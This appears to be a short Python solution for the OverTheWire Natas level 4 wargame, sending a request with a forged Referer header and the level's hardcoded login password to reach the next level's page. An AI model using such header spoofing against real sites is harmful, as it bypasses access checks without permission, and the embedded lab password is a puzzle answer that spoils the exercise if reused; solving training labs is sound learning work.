import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas4.natas.labs.overthewire.org/'
headers = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}
auth = HTTPBasicAuth('natas4', 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ')

response = requests.get(url, headers=headers, auth=auth)
print(response.text) 